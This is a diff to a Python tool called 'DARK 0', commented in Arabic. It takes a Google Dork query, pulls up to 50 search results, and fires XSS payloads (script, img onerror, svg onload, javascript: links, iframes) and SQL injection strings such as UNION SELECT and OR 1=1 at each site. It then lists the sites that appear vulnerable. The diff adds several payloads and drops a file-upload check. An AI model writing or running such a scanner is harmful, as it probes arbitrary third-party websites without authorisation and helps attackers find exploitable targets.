@@ -1,19 +1,21 @@
 import requests
 from googlesearch import search
 from colorama import Fore, Style
-from pyfiglet import figlet_format
+import pyfiglet
 
-# عرض اسم "DARK 0" باستخدام مكتبة pyfiglet
-def print_banner():
-    banner = figlet_format("DARK 0", font="starwars")
-    print(Fore.CYAN + banner + Style.RESET_ALL)
+# إعداد اسم البرنامج مع اللون الأزرق الفاتح
+ascii_banner = pyfiglet.figlet_format("DARK 0")
+print(Fore.CYAN + ascii_banner + Style.RESET_ALL)
 
 # اختبار ثغرات XSS مع بايلودات متعددة وتصنيفها
 def test_xss(url):
     xss_payloads = {
         "Reflected XSS": "<script>alert('XSS')</script>",
         "Stored XSS": "<img src=x onerror=alert('Stored XSS')>",
-        "DOM-Based XSS": "#<script>alert('DOM-Based XSS')</script>"
+        "DOM-Based XSS": "#<script>alert('DOM-Based XSS')</script>",
+        "Basic XSS": "<svg/onload=alert('XSS')>",
+        "Href XSS": "<a href='javascript:alert(1)'>Click me</a>",
+        "Iframe XSS": "<iframe src='javascript:alert(1)'></iframe>"
     }
     headers = {"User-Agent": "Mozilla/5.0"}
 
@@ -26,7 +28,7 @@ def test_xss(url):
                 if payload in confirm_response.text:
                     return xss_type
         except requests.RequestException:
-            continue
+            return False
     return False
 
 # اختبار ثغرات SQL Injection مع بايلودات متعددة وتأكيد وجودها
@@ -36,7 +38,8 @@ def test_sql_injection(url):
         "' UNION SELECT NULL, NULL--",
         "' OR 'a'='a",
         "\" OR \"\"=\"",
-        "OR 1=1--"
+        "OR 1=1--",
+        "' AND 1=2 UNION SELECT 1, 'anotherstring'"
     ]
     headers = {"User-Agent": "Mozilla/5.0"}
 
@@ -49,19 +52,7 @@ def test_sql_injection(url):
                 if "syntax error" in confirm_response.text.lower() or "sql" in confirm_response.text.lower():
                     return True
         except requests.RequestException:
-            continue
-    return False
-
-# اختبار ثغرات File Upload
-def test_file_upload(url):
-    # هذا اختبار مبسط. يجب أن يكون لديك خادم يدعم رفع الملفات لاختبار هذا
-    files = {'file': ('test.txt', 'test content')}
-    try:
-        response = requests.post(url, files=files, timeout=10)
-        if "uploaded" in response.text.lower():  # تعديل حسب استجابة الخادم عند نجاح رفع الملف
-            return True
-    except requests.RequestException:
-        return False
+            return False
     return False
 
 # الحصول على نتائج بحث Google باستخدام Google Dork
@@ -75,8 +66,6 @@ def get_google_search_results(query, num_results=10):
     return links
 
 def main():
-    print_banner()  # طباعة اسم "DARK 0" في البداية
-
     query = input("Enter the Google Dork query: ")
     num_results = 50  # عدد النتائج المراد جلبها
 
@@ -93,9 +82,6 @@ def main():
 
         if test_sql_injection(link):
             vulnerabilities.append("SQL Injection")
-        
-        if test_file_upload(link):
-            vulnerabilities.append("File Upload")
         
         if vulnerabilities:
             print(Fore.GREEN + f"{link} - Vulnerabilities: {', '.join(vulnerabilities)}" + Style.RESET_ALL)
